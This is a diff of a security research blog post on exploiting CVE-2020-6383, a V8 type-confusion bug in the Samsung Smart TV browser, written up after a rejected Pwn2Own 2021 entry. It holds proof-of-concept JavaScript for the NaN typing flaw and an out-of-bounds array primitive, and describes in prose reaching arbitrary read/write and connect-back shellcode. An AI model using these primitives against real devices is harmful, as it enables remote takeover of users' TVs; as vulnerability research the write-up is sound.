@@ -286,55 +286,55 @@
         
         <h2 id="overview">Overview</h2>
 
-<p>Next, following up on the “failed” Pwn2Own 2021 series, this blog post will be talking about the vulnerability found on Samsung TV - a Pwn2Own 2021 target.</p>
+<p>Next, following up on the <code class="language-plaintext highlighter-rouge">failed</code> Pwn2Own 2021 series, this blog post will be talking about the vulnerability found on <code class="language-plaintext highlighter-rouge">Samsung TV</code> - a Pwn2Own 2021 target.</p>
 
 <h2 id="vulnerability-summary">Vulnerability Summary</h2>
 
-<p>The default browser of Samsung Smart TV is chromium-based with obsolete version. So we use 1-day CVE-2020-6383 to exploit this device over this default browser. When user browse malicious content on the device’s browser, we can use this bug to run shellcode and obtain reverse shell connection from device.</p>
+<p>The default browser of Samsung Smart TV is chromium-based with obsolete version. So we use 1-day <code class="language-plaintext highlighter-rouge">CVE-2020-6383</code> to exploit this device over this default browser. When user browse malicious content on the device’s browser, we can use this bug to run shellcode and obtain reverse shell connection from device.</p>
 
 <h2 id="vulnerability-detail">Vulnerability Detail</h2>
 
 <p>The vulnerability is in JavaScript engine (V8) that used by default browser. When JS engine try to optimize this pattern of JS code:</p>
 
-<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="nx">initial</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">end</span><span class="p">;</span> <span class="nx">i</span><span class="o">+=</span><span class="nx">increment</span><span class="p">)</span> <span class="p">{</span>
-    <span class="p">...</span>
-<span class="p">}</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="nx">initial</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">end</span><span class="p">;</span> <span class="nx">i</span><span class="o">+=</span><span class="nx">increment</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+<span class="p">}</span></code></pre></figure>
 
-<span class="nx">The</span> <span class="kd">function</span> <span class="o">**</span><span class="nx">Typer</span><span class="p">::</span><span class="nx">Visitor</span><span class="p">::</span><span class="nx">TypeInductionVariablePhi</span><span class="o">**</span> <span class="nx">is</span> <span class="nx">called</span> <span class="nx">to</span> <span class="kd">get</span> <span class="nx">type</span> <span class="k">of</span> <span class="o">**</span><span class="nx">i</span><span class="o">**</span>
+<p>The function <code class="language-plaintext highlighter-rouge">Typer::Visitor::TypeInductionVariablePhi</code> is called to get type of <code class="language-plaintext highlighter-rouge">i</code></p>
 
-<span class="nx">Type</span> <span class="nx">Typer</span><span class="p">::</span><span class="nx">Visitor</span><span class="p">::</span><span class="nx">TypeInductionVariablePhi</span><span class="p">(</span><span class="nx">Node</span><span class="err">\</span><span class="o">*</span> <span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
-<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
-  <span class="kd">const</span> <span class="nx">bool</span> <span class="nx">both</span><span class="err">\</span><span class="nx">_types</span><span class="err">\</span><span class="nx">_integer</span> <span class="o">=</span> <span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">cache</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
-                                  <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">cache</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">);</span>
-  <span class="nx">bool</span> <span class="nx">maybe</span><span class="err">\</span><span class="nx">_nan</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">Type</span> <span class="nx">Typer</span><span class="p">::</span><span class="nx">Visitor</span><span class="p">::</span><span class="nx">TypeInductionVariablePhi</span><span class="p">(</span><span class="nx">Node</span><span class="o">*</span> <span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
+<span class="p">[...]</span>
+  <span class="kd">const</span> <span class="nx">bool</span> <span class="nx">both_types_integer</span> <span class="o">=</span> <span class="nx">initial_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer_</span><span class="o">-&gt;</span><span class="nx">cache_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+                                  <span class="nx">increment_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer_</span><span class="o">-&gt;</span><span class="nx">cache_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">);</span>
+  <span class="nx">bool</span> <span class="nx">maybe_nan</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
   <span class="c1">// The addition or subtraction could still produce a NaN, if the integer</span>
   <span class="c1">// ranges touch infinity.</span>
-  <span class="k">if</span> <span class="p">(</span><span class="nx">both</span><span class="err">\</span><span class="nx">_types</span><span class="err">\</span><span class="nx">_integer</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">Type</span> <span class="nx">resultant</span><span class="err">\</span><span class="nx">_type</span> <span class="o">=</span>
-        <span class="p">(</span><span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span>
-            <span class="p">?</span> <span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">operation</span><span class="err">\</span><span class="nx">_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberAdd</span><span class="p">(</span><span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">,</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">)</span>
-            <span class="p">:</span> <span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">operation</span><span class="err">\</span><span class="nx">_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberSubtract</span><span class="p">(</span><span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">,</span>
-                                                        <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">);</span>
-    <span class="nx">maybe</span><span class="err">\</span><span class="nx">_nan</span> <span class="o">=</span> <span class="nx">resultant</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Maybe</span><span class="p">(</span><span class="nx">Type</span><span class="p">::</span><span class="kc">NaN</span><span class="p">());</span> <span class="c1">// \*\*\* 1 \*\*\*</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">Type</span> <span class="nx">resultant_type</span> <span class="o">=</span>
+        <span class="p">(</span><span class="nx">arithmetic_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span>
+            <span class="p">?</span> <span class="nx">typer_</span><span class="o">-&gt;</span><span class="nx">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberAdd</span><span class="p">(</span><span class="nx">initial_type</span><span class="p">,</span> <span class="nx">increment_type</span><span class="p">)</span>
+            <span class="p">:</span> <span class="nx">typer_</span><span class="o">-&gt;</span><span class="nx">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberSubtract</span><span class="p">(</span><span class="nx">initial_type</span><span class="p">,</span>
+                                                        <span class="nx">increment_type</span><span class="p">);</span>
+    <span class="nx">maybe_nan</span> <span class="o">=</span> <span class="nx">resultant_type</span><span class="p">.</span><span class="nx">Maybe</span><span class="p">(</span><span class="nx">Type</span><span class="p">::</span><span class="kc">NaN</span><span class="p">());</span> 
   <span class="p">}</span>
 
-<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
+<span class="p">[...]</span>
 
-  <span class="k">if</span> <span class="p">(</span><span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">=</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
-    <span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">=</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">arithmetic_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">increment_min</span> <span class="o">=</span> <span class="nx">increment_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
+    <span class="nx">increment_max</span> <span class="o">=</span> <span class="nx">increment_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">DCHECK</span><span class="err">\</span><span class="nx">_EQ</span><span class="p">(</span><span class="na">InductionVariable</span><span class="p">::</span><span class="na">ArithmeticType</span><span class="p">::</span><span class="nx">kSubtraction</span><span class="p">,</span> <span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span><span class="p">);</span>
-    <span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
-    <span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
+    <span class="nx">DCHECK_EQ</span><span class="p">(</span><span class="na">InductionVariable</span><span class="p">::</span><span class="na">ArithmeticType</span><span class="p">::</span><span class="nx">kSubtraction</span><span class="p">,</span> <span class="nx">arithmetic_type</span><span class="p">);</span>
+    <span class="nx">increment_min</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
+    <span class="nx">increment_max</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
   <span class="p">}</span>
 
-  <span class="k">if</span> <span class="p">(</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer\_-&gt;cache\_-&gt;kInteger; // \*\*\* 2 \*\*\*</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">increment_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="p">[...]</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">increment_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="p">[...]</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer-&gt;cache-&gt;kInteger; </span>
   <span class="p">}</span></code></pre></figure>
 
-<p>The code assumes that when the <strong>increment</strong> variable can be both positive and negative, the result type of <strong>i</strong> will be <strong>kInteger</strong> (which doesn’t include <strong>NaN</strong>). However, since the value of <strong>increment</strong> can be changed from inside the loop body, it’s possible, for example, to set <strong>i = 0</strong> and <strong>increment = -Infinity</strong>, and then set <strong>increment</strong> to <strong>+Infinity</strong> inside the for loop. This will make <strong>i</strong> become <strong>NaN</strong> in the next iteration of the loop. This leads to type mismatch of variable i, engine thinks its type is <strong>kInteger</strong> (not include <strong>NaN</strong>) but it can be <strong>NaN</strong>. Here is the proof-of-concept:</p>
+<p>The code assumes that when the <code class="language-plaintext highlighter-rouge">increment</code> variable can be both positive and negative, the result type of <code class="language-plaintext highlighter-rouge">i</code> will be <code class="language-plaintext highlighter-rouge">kInteger</code> (which doesn’t include <code class="language-plaintext highlighter-rouge">NaN</code>). However, since the value of <code class="language-plaintext highlighter-rouge">increment</code> can be changed from inside the loop body, it’s possible, for example, to set <code class="language-plaintext highlighter-rouge">i = 0</code> and <code class="language-plaintext highlighter-rouge">increment = -Infinity</code>, and then set <code class="language-plaintext highlighter-rouge">increment</code> to <code class="language-plaintext highlighter-rouge">+Infinity</code> inside the for loop. This will make <code class="language-plaintext highlighter-rouge">i</code> become <code class="language-plaintext highlighter-rouge">NaN</code> in the next iteration of the loop. This leads to type mismatch of variable i, engine thinks its type is <code class="language-plaintext highlighter-rouge">kInteger</code> (not include <code class="language-plaintext highlighter-rouge">NaN</code>) but it can be <code class="language-plaintext highlighter-rouge">NaN</code>. Here is the proof-of-concept:</p>
 
 <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -346,30 +346,29 @@
 
 <h2 id="vulnerability-exploitation">Vulnerability Exploitation</h2>
 
-<p>The bug leads to mismatch type of <strong>i</strong> in optimization engine and actual value of <strong>i</strong>. Actual value of <strong>i</strong> is <strong>NaN</strong>, while optimization engine decides value of <strong>i</strong> is of type <strong>kInteger</strong>. We use this value as a <strong>length</strong> to construct a JS array. This mismatch of <strong>length</strong> value makes the <strong>length</strong> field is larger than the capacity of its backing store, leading an out-of-bound read/write to this array.</p>
+<p>The bug leads to mismatch type of <code class="language-plaintext highlighter-rouge">i</code> in optimization engine and actual value of <code class="language-plaintext highlighter-rouge">i</code>. Actual value of <code class="language-plaintext highlighter-rouge">i</code> is <code class="language-plaintext highlighter-rouge">NaN</code>, while optimization engine decides value of <code class="language-plaintext highlighter-rouge">i</code> is of type <code class="language-plaintext highlighter-rouge">kInteger</code>. We use this value as a <code class="language-plaintext highlighter-rouge">length</code> to construct a JS array. This mismatch of <code class="language-plaintext highlighter-rouge">length</code> value makes the <code class="language-plaintext highlighter-rouge">length</code> field is larger than the capacity of its backing store, leading an out-of-bound read/write to this array.</p>
 
 <p>Below is a Proof-of-concept that creates OOB read/write JS array</p>
 
-<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript">                                       <span class="c1">// i: kInteger &gt; \[-Infinity, Infinity\]</span>
-    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>     <span class="c1">// \[1024, Infinity\]</span>
-    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// \[-Infinity, -1024\]</span>
-    <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span>    <span class="c1">// \[-1025, -1024\]</span>
-    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// \[1024, 1025\]</span>
-    <span class="nx">value</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>                     <span class="c1">// \[2, 3\]</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript">                                       <span class="c1">// i: kInteger &gt; [-Infinity, Infinity]</span>
+    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>     <span class="c1">// [1024, Infinity]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// [-Infinity, -1024]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span>    <span class="c1">// [-1025, -1024]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// [1024, 1025]</span>
+    <span class="nx">value</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>                     <span class="c1">// [2, 3]</span>
     <span class="nx">value</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                       <span class="c1">// 0</span>
     <span class="nx">value</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>                       <span class="c1">// 10</span>
     <span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
-    <span class="nx">array</span><span class="err">\</span><span class="p">[</span><span class="mi">0</span><span class="err">\</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span></code></pre></figure>
+    <span class="nx">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span></code></pre></figure>
 
-<p>In optimization engine, the <strong>value</strong> of value is predicted to be 10. But the actual value is very large number because of mismatch type of <strong>i</strong></p>
+<p>In optimization engine, the <code class="language-plaintext highlighter-rouge">value</code> of value is predicted to be 10. But the actual value is very large number because of mismatch type of <code class="language-plaintext highlighter-rouge">i</code></p>
 
-<p>Additionally, JS array operator is optimized also. It uses actual value of <strong>value</strong> as a length but the backing store is create with the predicted value that much more smaller than length. So we can get OOB read/write to this new JS array. Use this array we can get an arbitrary read/write primitive. Final we use RWX page of WASM to run our connect-back shell-code.</p>
+<p>Additionally, JS array operator is optimized also. It uses actual value of <code class="language-plaintext highlighter-rouge">value</code> as a length but the backing store is create with the predicted value that much more smaller than length. So we can get OOB read/write to this new JS array. Use this array we can get an arbitrary read/write primitive. Final we use RWX page of WASM to run our connect-back shell-code.</p>
 
 <h2 id="timeline">Timeline</h2>
 
-<p>10/29/2021: Exploit submitted to Pwn2Own Competition</p>
-
-<p>11/01/2021: Submission got rejected due to the usage of n-day</p>
+<p>10/29/2021: Exploit submitted to Pwn2Own Competition<br />
+11/01/2021: Submission got rejected due to the usage of n-day</p>
 
         
       </section>
@@ -404,8 +403,7 @@
 ">Previous</a>
     
     
-      <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" class="pagination--pager" title="Welcome to Jekyll!
-">Next</a>
+      <a href="#" class="pagination--pager disabled">Next</a>
     
   </nav>
 
@@ -419,45 +417,6 @@
     <div class="page__related">
       <h4 class="page__related-title">You May Also Enjoy</h4>
       <div class="grid__wrapper">
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" rel="permalink">Welcome to Jekyll!
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-
-    
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
-        
-          less than 1 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different wa...</p>
-  </article>
-</div>
-
         
           
 
@@ -534,7 +493,7 @@
   </p>
 
 
-    <p class="archive__item-excerpt" itemprop="description">I. SUMMARY
+    <p class="archive__item-excerpt" itemprop="description">Vulnerability Summary
 
 </p>
   </article>
@@ -550,7 +509,7 @@
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/research/2021/09/17/weak-rsa-in-realworld-vietnamese.html" rel="permalink">[Tiếng Việt] Tôi đã fake hơn 250k giấy đi đường như thế nào
+        <a href="/research/2021/08/21/zdi-21-977-d-link-dap-2020-webproc-stack-based-bof-rce.html" rel="permalink">[ZDI-21-977] D-Link DAP-2020 webproc Stack-based BOF RCE
 </a>
       
     </h2>
@@ -568,14 +527,55 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          7 minute read
+          2 minute read
         
       </span>
     
   </p>
 
 
-    <p class="archive__item-excerpt" itemprop="description">I. TÓM TẮT
+    <p class="archive__item-excerpt" itemprop="description">Overview
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/research/2021/02/27/zdi-21-203-d-link-dap-2020-webproc-getpage-stack-based-bof-rce.html" rel="permalink">[ZDI-21-203] D-Link DAP-2020 webproc getpage Stack-based BOF RCE
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Overview
 
 </p>
   </article>
